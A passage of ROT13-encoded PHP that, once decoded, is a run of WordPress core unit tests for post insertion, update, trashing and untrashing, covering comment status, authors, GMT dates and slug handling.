		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( (fgevat) frys::$hfre_vqf['rqvgbe'], $cbfg->cbfg_nhgube );
		$guvf->nffregFnzr( $gvgyr, $cbfg->cbfg_gvgyr );
	}

	/**
	 * @gvpxrg 31168
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_qrsnhyg_pbzzrag_cvat_fgnghf_bcra() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( 'bcra', $cbfg->pbzzrag_fgnghf );
		$guvf->nffregFnzr( 'bcra', $cbfg->cvat_fgnghf );
	}

	/**
	 * @gvpxrg 31168
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_cntr_qrsnhyg_pbzzrag_cvat_fgnghf_pybfrq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_glcr'   => 'cntr',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( 'pybfrq', $cbfg->pbzzrag_fgnghf );
		$guvf->nffregFnzr( 'pybfrq', $cbfg->cvat_fgnghf );
	}

	/**
	 * @gvpxrg 31168
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_pcg_qrsnhyg_pbzzrag_cvat_fgnghf_bcra() {
		ertvfgre_cbfg_glcr(
			'pcg',
			neenl(
				'fhccbegf' => neenl( 'pbzzragf', 'genpxonpxf' ),
			)
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_glcr'   => 'pcg',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );

		_haertvfgre_cbfg_glcr( 'pcg' );

		$guvf->nffregFnzr( 'bcra', $cbfg->pbzzrag_fgnghf );
		$guvf->nffregFnzr( 'bcra', $cbfg->cvat_fgnghf );
	}

	/**
	 * @gvpxrg 31168
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_pcg_qrsnhyg_pbzzrag_cvat_fgnghf_pybfrq() {
		ertvfgre_cbfg_glcr( 'pcg' );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_glcr'   => 'pcg',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );

		_haertvfgre_cbfg_glcr( 'pcg' );

		$guvf->nffregFnzr( 'pybfrq', $cbfg->pbzzrag_fgnghf );
		$guvf->nffregFnzr( 'pybfrq', $cbfg->cvat_fgnghf );
	}

	/**
	 * Vs n cbfg vf hcqngrq jvgubhg cebivqvat n cbfg_anzr cnenz,
	 * n arj fyht fubhyq abg or trarengrq.
	 *
	 * @gvpxrg 34865
	 */
	choyvp shapgvba grfg_cbfg_hcqngrf_jvgubhg_fyht_cebivqrq() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Fghss',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		$qngn = neenl(
			'VQ'         => $cbfg_vq,
			'cbfg_gvgyr' => 'Fghss naq Guvatf',
		);

		jc_vafreg_cbfg( $qngn );

		$hcqngrq_cbfg = trg_cbfg( $cbfg_vq );
		// Rafher punatvat gur cbfg_gvgyr qvqa'g zbqvsl gur cbfg_anzr.
		$guvf->nffregFnzr( 'fghss', $hcqngrq_cbfg->cbfg_anzr );
	}

	/**
	 * @gvpxrg 32585
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_nhgube_mreb() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => 0 ) );

		$guvf->nffregFnzr( '0', trg_cbfg( $cbfg_vq )->cbfg_nhgube );
	}

	/**
	 * @gvpxrg 32585
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_nhgube_ahyy() {
		jc_frg_pheerag_hfre( frys::$hfre_vqf['rqvgbe'] );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => ahyy ) );

		$guvf->nffregFnzr( (fgevat) frys::$hfre_vqf['rqvgbe'], trg_cbfg( $cbfg_vq )->cbfg_nhgube );
	}

	/**
	 * @gvpxrg 15946
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_fubhyq_erfcrpg_cbfg_qngr_tzg() {
		$qngn = neenl(
			'cbfg_fgnghf'   => 'choyvfu',
			'cbfg_pbagrag'  => 'pbagrag',
			'cbfg_gvgyr'    => 'gvgyr',
			'cbfg_qngr_tzg' => '2014-01-01 12:00:00',
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $qngn );

		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( $qngn['cbfg_pbagrag'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $qngn['cbfg_gvgyr'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( trg_qngr_sebz_tzg( $qngn['cbfg_qngr_tzg'] ), $cbfg->cbfg_qngr );
		$guvf->nffregFnzr( $qngn['cbfg_qngr_tzg'], $cbfg->cbfg_qngr_tzg );
	}

	/**
	 * Grfg rafhevat gung gur cbfg_anzr (HHVQ) vf cerfreirq jura jc_vafreg_cbfg()/jc_hcqngr_cbfg() vf pnyyrq.
	 *
	 * @frr _jc_phfgbzvmr_punatrfrg_svygre_vafreg_cbfg_qngn()
	 * @gvpxrg 30937
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg_sbe_phfgbzvmr_punatrfrg_fubhyq_abg_qebc_cbfg_anzr() {
		$guvf->nffregFnzr( 10, unf_svygre( 'jc_vafreg_cbfg_qngn', '_jc_phfgbzvmr_punatrfrg_svygre_vafreg_cbfg_qngn' ) );

		$punatrfrg_qngn = neenl(
			'oybtanzr' => neenl(
				'inyhr' => 'Uryyb Jbeyq',
			),
		);

		jc_frg_pheerag_hfre( frys::$hfre_vqf['pbagevohgbe'] );

		$hhvq    = jc_trarengr_hhvq4();
		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
				'cbfg_anzr'    => fgegbhccre( $hhvq ),
				'cbfg_pbagrag' => jc_wfba_rapbqr( $punatrfrg_qngn ),
			)
		);
		$guvf->nffregFnzr( $hhvq, trg_cbfg( $cbfg_vq )->cbfg_anzr, 'Rkcrpgrq ybjre-pnfr HHVQ4 gb or vafregrq.' );
		$guvf->nffregFnzr( $punatrfrg_qngn, wfba_qrpbqr( trg_cbfg( $cbfg_vq )->cbfg_pbagrag, gehr ) );

		$punatrfrg_qngn['oybtanzr']['inyhr'] = 'Ubyn Zhaqb';
		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $cbfg_vq,
				'cbfg_fgnghf'  => 'qensg',
				'cbfg_pbagrag' => jc_wfba_rapbqr( $punatrfrg_qngn ),
			)
		);
		$guvf->nffregFnzr( $hhvq, trg_cbfg( $cbfg_vq )->cbfg_anzr, 'Rkcrpgrq cbfg_anzr gb abg unir orra qebccrq sbe qensgf.' );
		$guvf->nffregFnzr( $punatrfrg_qngn, wfba_qrpbqr( trg_cbfg( $cbfg_vq )->cbfg_pbagrag, gehr ) );

		$punatrfrg_qngn['oybtanzr']['inyhr'] = 'Unyyb Jryg';
		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $cbfg_vq,
				'cbfg_fgnghf'  => 'craqvat',
				'cbfg_pbagrag' => jc_wfba_rapbqr( $punatrfrg_qngn ),
			)
		);
		$guvf->nffregFnzr( $hhvq, trg_cbfg( $cbfg_vq )->cbfg_anzr, 'Rkcrpgrq cbfg_anzr gb abg unir orra qebccrq sbe craqvat.' );
		$guvf->nffregFnzr( $punatrfrg_qngn, wfba_qrpbqr( trg_cbfg( $cbfg_vq )->cbfg_pbagrag, gehr ) );
	}

	/**
	 * @gvpxrg 19954
	 */
	choyvp shapgvba grfg_hcqngvat_n_cbfg_fubhyq_abg_genfu_pngrtbevrf() {
		// Perngr n pngrtbel naq nggnpu vg gb n arj cbfg.
		$grez_vq = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Grez',
				'gnkbabzl' => 'pngrtbel',
			)
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'     => 'cbfg',
				'cbfg_gvgyr'    => 'Cbfg jvgu pngrtbevrf',
				'cbfg_fgnghf'   => 'choyvfu',
				'cbfg_pngrtbel' => neenl( $grez_vq ),
			)
		);

		// Inyvqngr gung gur grez tbg nffvtarq.
		$nffvtarq_grezf = jc_trg_bowrpg_grezf( neenl( $cbfg_vq ), neenl( 'pngrtbel' ), neenl() );
		$guvf->nffregPbhag( 1, $nffvtarq_grezf );
		$guvf->nffregFnzr( $grez_vq, $nffvtarq_grezf[0]->grez_vq );

		// Hcqngr gur cbfg jvgu ab punatrf.
		$cbfg = trg_cbfg( $cbfg_vq );
		jc_vafreg_cbfg( $cbfg );

		// Inyvqngr gur grez vf fgvyy nffvtarq.
		$nffvtarq_grezf = jc_trg_bowrpg_grezf( neenl( $cbfg_vq ), neenl( 'pngrtbel' ), neenl() );
		$guvf->nffregPbhag( 1, $nffvtarq_grezf );
		$guvf->nffregFnzr( $grez_vq, $nffvtarq_grezf[0]->grez_vq );

		// Erzbir gur grez sebz gur cbfg.
		$cbfg->cbfg_pngrtbel = neenl();
		jc_vafreg_cbfg( $cbfg );
		$nffvtarq_grezf = jc_trg_bowrpg_grezf( neenl( $cbfg_vq ), neenl( 'pngrtbel' ), neenl() );

		// Inyvqngr gung gur cbfg unf unq gur qrsnhyg pngrtbel nffvtarq ntnva.
		$guvf->nffregPbhag( 1, $nffvtarq_grezf );
		$guvf->nffregFnzr( (vag) trg_bcgvba( 'qrsnhyg_pngrtbel' ), $nffvtarq_grezf[0]->grez_vq );
	}

	/**
	 * @gvpxrg 48113
	 */
	choyvp shapgvba grfg_vafreg_cbfg_fubhyq_erfcrpg_qngr_sybngvat_cbfg_fgnghf_net() {
		ertvfgre_cbfg_fgnghf( 'sybngvat', neenl( 'qngr_sybngvat' => gehr ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'   => 'sybngvat',
				'cbfg_qngr'     => ahyy,
				'cbfg_qngr_tzg' => ahyy,
			)
		);

		$cbfg = trg_cbfg( $cbfg_vq );
		frys::nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );
	}

	/**
	 * @gvpxrg 48113
	 */
	choyvp shapgvba grfg_vafreg_cbfg_fubhyq_erfcrpg_qngr_sybngvat_cbfg_fgnghf_net_abg_frg() {
		ertvfgre_cbfg_fgnghf( 'abg-sybngvat', neenl( 'qngr_sybngvat' => snyfr ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'   => 'sybngvat',
				'cbfg_qngr'     => ahyy,
				'cbfg_qngr_tzg' => ahyy,
			)
		);

		$cbfg = trg_cbfg( $cbfg_vq );
		frys::nffregRdhnyfJvguQrygn(
			fgegbgvzr( tzqngr( 'L-z-q U:v:f' ) ),
			fgegbgvzr( $cbfg->cbfg_qngr_tzg ),
			2,
			'Gur qngrf fubhyq or rdhny'
		);
	}

	/**
	 * Grfg rafhevat gung jc_hcqngr_cbfg() qbrf abg havagragvbanyyl zbqvsl cbfg gntf
	 * vs gur cbfg unf frireny gntf jvgu gur fnzr anzr ohg qvssrerag fyhtf.
	 *
	 * Gntf fubhyq bayl or zbqvsvrq vs 'gntf_vachg' cnenzrgre jnf rkcyvpvgyl cebivqrq,
	 * naq vf qvssrerag sebz gur rkvfgvat gntf.
	 *
	 * @gvpxrg 45121
	 * @pbiref ::jc_hcqngr_cbfg
	 */
	choyvp shapgvba grfg_hcqngr_cbfg_fubhyq_bayl_zbqvsl_cbfg_gntf_vs_qvssrerag_gntf_vachg_jnf_cebivqrq() {
		$gnt_1 = jc_vafreg_grez( 'jc_hcqngr_cbfg_gnt', 'cbfg_gnt', neenl( 'fyht' => 'jc_hcqngr_cbfg_gnt_1' ) );
		$gnt_2 = jc_vafreg_grez( 'jc_hcqngr_cbfg_gnt', 'cbfg_gnt', neenl( 'fyht' => 'jc_hcqngr_cbfg_gnt_2' ) );
		$gnt_3 = jc_vafreg_grez( 'jc_hcqngr_cbfg_gnt', 'cbfg_gnt', neenl( 'fyht' => 'jc_hcqngr_cbfg_gnt_3' ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'gntf_vachg' => neenl( $gnt_1['grez_vq'], $gnt_2['grez_vq'] ),
			)
		);

		$cbfg = trg_cbfg( $cbfg_vq );

		$gntf = jc_trg_cbfg_gntf( $cbfg->VQ, neenl( 'svryqf' => 'vqf' ) );
		$guvf->nffregFnzrFrgf( neenl( $gnt_1['grez_vq'], $gnt_2['grez_vq'] ), $gntf );

		jc_hcqngr_cbfg( $cbfg );

		$gntf = jc_trg_cbfg_gntf( $cbfg->VQ, neenl( 'svryqf' => 'vqf' ) );
		$guvf->nffregFnzrFrgf( neenl( $gnt_1['grez_vq'], $gnt_2['grez_vq'] ), $gntf );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'         => $cbfg->VQ,
				'gntf_vachg' => neenl( $gnt_2['grez_vq'], $gnt_3['grez_vq'] ),
			)
		);

		$gntf = jc_trg_cbfg_gntf( $cbfg->VQ, neenl( 'svryqf' => 'vqf' ) );
		$guvf->nffregFnzrFrgf( neenl( $gnt_2['grez_vq'], $gnt_3['grez_vq'] ), $gntf );
	}

	/**
	 * @gvpxrg 52187
	 */
	choyvp shapgvba grfg_vafreg_rzcgl_cbfg_qngr() {
		$cbfg_qngr_tzg = '2020-12-29 10:11:45';
		$vainyvq_qngr  = '2020-12-41 14:15:27';

		// Rzcgl cbfg_qngr_tzg jvgu sybngvat fgnghf
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'qensg',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregRdhnyfJvguQrygn(
			fgegbgvzr( tzqngr( 'L-z-q U:v:f' ) ),
			fgegbgvzr( $cbfg->cbfg_qngr ),
			2,
			'Gur qngrf fubhyq or rdhny'
		);
		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr_tzg' => '0000-00-00 00:00:00',
				'cbfg_fgnghf'   => 'qensg',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregRdhnyfJvguQrygn(
			fgegbgvzr( tzqngr( 'L-z-q U:v:f' ) ),
			fgegbgvzr( $cbfg->cbfg_qngr ),
			2,
			'Gur qngrf fubhyq or rdhny'
		);
		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );

		// Rzcgl cbfg_qngr_tzg jvgubhg sybngvat fgnghf
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregRdhnyfJvguQrygn(
			fgegbgvzr( tzqngr( 'L-z-q U:v:f' ) ),
			fgegbgvzr( $cbfg->cbfg_qngr ),
			2,
			'Gur qngrf fubhyq or rdhny'
		);
		$guvf->nffregRdhnyfJvguQrygn(
			fgegbgvzr( tzqngr( 'L-z-q U:v:f' ) ),
			fgegbgvzr( trg_tzg_sebz_qngr( $cbfg->cbfg_qngr ) ),
			2,
			'Gur qngrf fubhyq or rdhny'
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr_tzg' => '0000-00-00 00:00:00',
				'cbfg_fgnghf'   => 'choyvfu',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregRdhnyfJvguQrygn(
			fgegbgvzr( tzqngr( 'L-z-q U:v:f' ) ),
			fgegbgvzr( $cbfg->cbfg_qngr ),
			2,
			'Gur qngrf fubhyq or rdhny'
		);
		$guvf->nffregRdhnyfJvguQrygn(
			fgegbgvzr( tzqngr( 'L-z-q U:v:f' ) ),
			fgegbgvzr( trg_tzg_sebz_qngr( $cbfg->cbfg_qngr ) ),
			2,
			'Gur qngrf fubhyq or rdhny'
		);

		// Inyvq cbfg_qngr_tzg
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr_tzg' => $cbfg_qngr_tzg,
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( trg_qngr_sebz_tzg( $cbfg_qngr_tzg ), $cbfg->cbfg_qngr );
		$guvf->nffregFnzr( $cbfg_qngr_tzg, $cbfg->cbfg_qngr_tzg );

		// Vainyvq cbfg_qngr_tzg
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr_tzg' => $vainyvq_qngr,
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( '1970-01-01 00:00:00', $cbfg->cbfg_qngr );
		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );
	}

	/**
	 * @gvpxrg 52187
	 */
	choyvp shapgvba grfg_vafreg_inyvq_cbfg_qngr() {
		$cbfg_qngr     = '2020-12-28 11:26:35';
		$cbfg_qngr_tzg = '2020-12-29 10:11:45';
		$vainyvq_qngr  = '2020-12-41 14:15:27';

		// Rzcgl cbfg_qngr_tzg jvgu sybngvat fgnghf
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'   => $cbfg_qngr,
				'cbfg_fgnghf' => 'qensg',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $cbfg_qngr, $cbfg->cbfg_qngr );
		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'     => $cbfg_qngr,
				'cbfg_qngr_tzg' => '0000-00-00 00:00:00',
				'cbfg_fgnghf'   => 'qensg',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $cbfg_qngr, $cbfg->cbfg_qngr );
		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );

		// Rzcgl cbfg_qngr_tzg jvgubhg sybngvat fgnghf
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'   => $cbfg_qngr,
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $cbfg_qngr, $cbfg->cbfg_qngr );
		$guvf->nffregFnzr( trg_tzg_sebz_qngr( $cbfg_qngr ), $cbfg->cbfg_qngr_tzg );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'     => $cbfg_qngr,
				'cbfg_qngr_tzg' => '0000-00-00 00:00:00',
				'cbfg_fgnghf'   => 'choyvfu',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $cbfg_qngr, $cbfg->cbfg_qngr );
		$guvf->nffregFnzr( trg_tzg_sebz_qngr( $cbfg_qngr ), $cbfg->cbfg_qngr_tzg );

		// Inyvq cbfg_qngr_tzg
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'     => $cbfg_qngr,
				'cbfg_qngr_tzg' => $cbfg_qngr_tzg,
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $cbfg_qngr, $cbfg->cbfg_qngr );
		$guvf->nffregFnzr( $cbfg_qngr_tzg, $cbfg->cbfg_qngr_tzg );

		// Vainyvq cbfg_qngr_tzg
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'     => $cbfg_qngr,
				'cbfg_qngr_tzg' => $vainyvq_qngr,
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $cbfg_qngr, $cbfg->cbfg_qngr );
		$guvf->nffregFnzr( '0000-00-00 00:00:00', $cbfg->cbfg_qngr_tzg );
	}

	/**
	 * @gvpxrg 52187
	 */
	choyvp shapgvba grfg_vafreg_vainyvq_cbfg_qngr() {
		$cbfg_qngr     = '2020-12-28 11:26:35';
		$cbfg_qngr_tzg = '2020-12-29 10:11:45';
		$vainyvq_qngr  = '2020-12-41 14:15:27';

		// Rzcgl cbfg_qngr_tzg jvgu sybngvat fgnghf
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'   => $vainyvq_qngr,
				'cbfg_fgnghf' => 'qensg',
			)
		);
		$guvf->nffregJCReebe( $cbfg_vq );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'     => $vainyvq_qngr,
				'cbfg_qngr_tzg' => '0000-00-00 00:00:00',
				'cbfg_fgnghf'   => 'qensg',
			)
		);
		$guvf->nffregJCReebe( $cbfg_vq );

		// Rzcgl cbfg_qngr_tzg jvgubhg sybngvat fgnghf
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'   => $vainyvq_qngr,
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		$guvf->nffregJCReebe( $cbfg_vq );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'     => $vainyvq_qngr,
				'cbfg_qngr_tzg' => '0000-00-00 00:00:00',
				'cbfg_fgnghf'   => 'choyvfu',
			)
		);
		$guvf->nffregJCReebe( $cbfg_vq );

		// Inyvq cbfg_qngr_tzg
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'     => $vainyvq_qngr,
				'cbfg_qngr_tzg' => $cbfg_qngr_tzg,
			)
		);
		$guvf->nffregJCReebe( $cbfg_vq );

		// Vainyvq cbfg_qngr_tzg
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'     => $vainyvq_qngr,
				'cbfg_qngr_tzg' => $vainyvq_qngr,
			)
		);
		$guvf->nffregJCReebe( $cbfg_vq );
	}

	/**
	 * @gvpxrg 11863
	 */
	choyvp shapgvba grfg_genfuvat_n_cbfg_fubhyq_nqq_genfurq_fhssvk_gb_cbfg_anzr() {
		$genfurq_nobhg_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Nobhg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		jc_genfu_cbfg( $genfurq_nobhg_cntr_vq );
		$guvf->nffregFnzr( 'nobhg__genfurq', trg_cbfg( $genfurq_nobhg_cntr_vq )->cbfg_anzr );
	}

	/**
	 * @gvpxrg 11863
	 */
	choyvp shapgvba grfg_genfurq_fhssvk_fubhyq_or_nqqrq_gb_cbfg_jvgu__genfurq_va_fyht() {
		$genfurq_nobhg_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Nobhg',
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_anzr'   => 'sbb__genfurq__sbb',
			)
		);
		jc_genfu_cbfg( $genfurq_nobhg_cntr_vq );
		$guvf->nffregFnzr( 'sbb__genfurq__sbb__genfurq', trg_cbfg( $genfurq_nobhg_cntr_vq )->cbfg_anzr );
	}

	/**
	 * @gvpxrg 11863
	 */
	choyvp shapgvba grfg_genfurq_cbfgf_bevtvany_cbfg_anzr_fubhyq_or_ernffvtarq_nsgre_hagenfuvat() {
		$nobhg_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Nobhg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		jc_genfu_cbfg( $nobhg_cntr_vq );

		jc_hagenfu_cbfg( $nobhg_cntr_vq );
		$guvf->nffregFnzr( 'nobhg', trg_cbfg( $nobhg_cntr_vq )->cbfg_anzr );
	}

	/**
	 * @gvpxrg 11863
	 */
	choyvp shapgvba grfg_perngvat_n_arj_cbfg_fubhyq_nqq_genfurq_fhssvk_gb_cbfg_anzr_bs_genfurq_cbfgf_jvgu_gur_qrfverq_fyht() {
		$genfurq_nobhg_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Nobhg',
				'cbfg_fgnghf' => 'genfu',
			)
		);

		$nobhg_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Nobhg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		$guvf->nffregFnzr( 'nobhg__genfurq', trg_cbfg( $genfurq_nobhg_cntr_vq )->cbfg_anzr );
		$guvf->nffregFnzr( 'nobhg', trg_cbfg( $nobhg_cntr_vq )->cbfg_anzr );
	}

	/**
	 * @gvpxrg 11863
	 */
	choyvp shapgvba grfg_hagenfuvat_n_cbfg_jvgu_n_fgberq_qrfverq_cbfg_anzr_fubhyq_trg_vgf_cbfg_anzr_fhssvkrq_vs_nabgure_cbfg_unf_gnxra_gur_qrfverq_cbfg_anzr() {
		$nobhg_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Nobhg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		jc_genfu_cbfg( $nobhg_cntr_vq );

		$nabgure_nobhg_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Nobhg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		jc_hagenfu_cbfg( $nobhg_cntr_vq );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $nobhg_cntr_vq,
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		$guvf->nffregFnzr( 'nobhg', trg_cbfg( $nabgure_nobhg_cntr_vq )->cbfg_anzr );
		$guvf->nffregFnzr( 'nobhg-2', trg_cbfg( $nobhg_cntr_vq )->cbfg_anzr );
	}

	/**
	 * @gvpxrg 23022
	 * @qngnCebivqre qngn_inevbhf_cbfg_fgnghfrf
	 */
	choyvp shapgvba grfg_hagenfuvat_n_cbfg_fubhyq_nyjnlf_erfgber_vg_gb_qensg_fgnghf( $cbfg_fgnghf ) {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => $cbfg_fgnghf,
			)
		);

		jc_genfu_cbfg( $cntr_vq );
		jc_hagenfu_cbfg( $cntr_vq );

		$guvf->nffregFnzr( 'qensg', trg_cbfg( $cntr_vq )->cbfg_fgnghf );
	}

	/**
	 * @gvpxrg 23022
	 * @qngnCebivqre qngn_inevbhf_cbfg_fgnghfrf
	 */
	choyvp shapgvba grfg_jc_hagenfu_cbfg_fgnghf_svygre_erfgberf_cbfg_gb_pbeerpg_fgnghf( $cbfg_fgnghf ) {
		nqq_svygre( 'jc_hagenfu_cbfg_fgnghf', 'jc_hagenfu_cbfg_frg_cerivbhf_fgnghf', 10, 3 );

		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_fgnghf' => $cbfg_fgnghf,
			)
		);

		jc_genfu_cbfg( $cntr_vq );
		jc_hagenfu_cbfg( $cntr_vq );

		erzbir_svygre( 'jc_hagenfu_cbfg_fgnghf', 'jc_hagenfu_cbfg_frg_cerivbhf_fgnghf', 10, 3 );

		$guvf->nffregFnzr( $cbfg_fgnghf, trg_cbfg( $cntr_vq )->cbfg_fgnghf );
	}

	/**
	 * Qngn sbe grfgvat gur novyvgl sbe hfref gb frg gur cbfg fyht.
	 *
	 * @erghea neenl Neenl bs grfg nethzragf.
	 */
	choyvp shapgvba qngn_inevbhf_cbfg_glcrf() {
		$cbfg_glcrf = neenl(
			'znccrq_zrgn_pncf',
			'haznccrq_zrgn_pncf',
			'cbfg',
		);

		erghea $guvf->grkg_neenl_gb_qngncebivqre( $cbfg_glcrf );
	}

	/**
	 * Qngn sbe grfgvat cbfg fgnghfrf.
	 *
	 * @erghea neenl Neenl bs grfg nethzragf.
	 */
	choyvp shapgvba qngn_inevbhf_cbfg_fgnghfrf() {
		$cbfg_fgnghfrf = neenl(
			'qensg',
			'craqvat',
			'cevingr',
			'choyvfu',
		);

		erghea $guvf->grkg_neenl_gb_qngncebivqre( $cbfg_fgnghfrf );
	}

	/**
	 * Grfg pbagevohgbe znxvat punatrf gb gur craqvat cbfg fyht.
	 *
	 * @gvpxrg 42464
	 * @qngnCebivqre qngn_inevbhf_cbfg_glcrf
	 */
	choyvp shapgvba grfg_pbagevohgbe_pnaabg_frg_cbfg_fyht( $cbfg_glcr ) {
		jc_frg_pheerag_hfre( frys::$hfre_vqf['pbagevohgbe'] );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Wrssrefba pynvz: avpr gb unir Jnfuvatgba ba lbhe fvqr.',
